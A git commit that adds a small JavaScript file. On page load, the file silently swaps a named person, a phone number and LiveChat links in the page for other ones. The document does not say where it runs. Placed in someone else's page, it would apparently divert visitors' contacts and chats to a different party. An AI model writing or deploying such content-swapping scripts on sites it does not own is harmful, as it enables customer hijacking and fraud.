d1a53e305e4bf9d135b738ee789b33ab5a8c0013
inggarfi <inggarsaput@gmail.com>
2025-06-17 10:12:07 +0700

    Add files via upload

---
+++ amib4.js
@@ -0,0 +1,7 @@
+document.addEventListener("DOMContentLoaded", function () {
+    document.body.innerHTML = document.body.innerHTML
+        .replace(/ONGKI ANDRIAN/g, 'Surwati')
+        .replace(/0895410800347/g, '088214538915')
+        .replace(/https:\/\/direct\.lc\.chat\/19199530\//g, 'https://direct.lc.chat/19188360/')
+        .replace(/https:\/\/secure\.livechatinc\.com\/customer\/action\/open_chat\?license_id=19199530/g, 'https://direct.lc.chat/19188360/');
+});
